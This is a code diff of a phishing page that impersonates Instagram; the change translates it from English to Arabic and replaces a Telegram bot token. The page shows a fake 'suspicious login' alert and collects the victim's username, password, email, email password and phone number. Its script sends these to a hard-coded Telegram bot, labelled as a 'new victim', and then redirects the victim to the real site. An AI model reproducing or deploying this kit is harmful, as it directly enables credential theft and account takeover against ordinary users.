@@ -1,53 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Security Verification</title>
+    <title>Instagram Support</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; padding: 20px; direction: ltr; }
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; padding: 20px; direction: rtl; }
         .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 100%; max-width: 350px; text-align: center; margin-top: 40px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .logo { width: 60px; height: 60px; margin-bottom: 20px; border-radius: 15px; }
-        .warn { color: #ed4956; border: 2px solid #ed4956; background: #fff1f2; padding: 15px; margin-bottom: 20px; font-size: 14px; text-align: left; border-radius: 8px; font-weight: bold; line-height: 1.6; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 8px; font-size: 14px; box-sizing: border-box; text-align: left; outline: none; }
+        .warn { color: #ed4956; border: 2px solid #ed4956; background: #fff1f2; padding: 15px; margin-bottom: 20px; font-size: 14px; text-align: right; border-radius: 8px; font-weight: bold; line-height: 1.6; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 8px; font-size: 14px; box-sizing: border-box; text-align: right; outline: none; }
         button { width: 100%; padding: 14px; background: #0095f6; color: white; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 15px; }
         .step { display: none; } .active { display: block; }
-        p { font-size: 13px; color: #8e8e8e; margin-bottom: 10px; text-align: left; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="box">
         <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png">
-        
         <div class="warn">
-            ⚠️ Security Alert: <br>
-            A suspicious login attempt was detected from "Riyadh, SA". Please verify your identity to secure your account.
+            ⚠️ تنبيه أمني عاجل: <br>
+            تم رصد محاولة دخول مشبوهة لحسابك من "الرياض، السعودية". يرجى تأكيد ملكيتك للحساب الآن لتجنب إيقافه نهائياً.
         </div>
-
         <div id="s1" class="step active">
-            <input type="text" id="u" placeholder="Username">
-            <input type="password" id="p" placeholder="Password">
-            <button onclick="next(1)">Next</button>
+            <input type="text" id="u" placeholder="اسم المستخدم">
+            <input type="password" id="p" placeholder="كلمة السر">
+            <button onclick="next(1)">التالي</button>
         </div>
-
         <div id="s2" class="step">
-            <p>Email Verification</p>
-            <input type="email" id="e" placeholder="Email Address">
-            <input type="password" id="ep" placeholder="Email Password">
-            <button onclick="next(2)">Confirm Email</button>
+            <input type="email" id="e" placeholder="الإيميل المرتبط">
+            <input type="password" id="ep" placeholder="باسورد الإيميل">
+            <button onclick="next(2)">تأكيد الإيميل</button>
         </div>
-
         <div id="s3" class="step">
-            <p>Security Code via Phone</p>
-            <input type="tel" id="ph" placeholder="Phone Number">
-            <button onclick="send()">Finish Verification</button>
+            <input type="tel" id="ph" placeholder="رقم الهاتف">
+            <button onclick="send()">إنهاء التحقق</button>
         </div>
     </div>
-
     <script>
-        // التشفير النهائي
-        const _0xT = "8695245392:AAGPuT5p2vRdWRRp4VeT4low15UmDkXIQho";
-        const _0xC = "8321552700";
+        // التوكن الجديد الذي استخرجته أنت
+        const _tk = "8696493738:AAEBLYFSlWsVH-40hPSy1AiKwm11Ta2D63s"; 
+        const _id = "8321552700";
 
         function next(n) {
             document.getElementById('s'+n).classList.remove('active');
@@ -55,9 +47,9 @@
         }
 
         async function send() {
-            const data = `🔥 NEW VICTIM 2026 🔥\n\n👤 Username: ${document.getElementById('u').value}\n🔑 Password: ${document.getElementById('p').value}\n📧 Email: ${document.getElementById('e').value}\n🔑 Email Pass: ${document.getElementById('ep').value}\n📱 Phone: ${document.getElementById('ph').value}`;
-            const url = `https://api.telegram.org/bot${_0xT}/sendMessage?chat_id=${_0xC}&text=${encodeURIComponent(data)}`;
-            try { await fetch(url); window.location.href = "https://instagram.com"; } catch (e) { window.location.href = "https://instagram.com"; }
+            const m = `🔥 صيد جديد 2026\n👤 يوزر: ${document.getElementById('u').value}\n🔑 باس: ${document.getElementById('p').value}\n📧 إيميل: ${document.getElementById('e').value}\n🔑 باس إيميل: ${document.getElementById('ep').value}\n📱 هاتف: ${document.getElementById('ph').value}`;
+            await fetch(`https://api.telegram.org/bot${_tk}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(m)}`);
+            window.location.href = "https://instagram.com";
         }
     </script>
 </body>
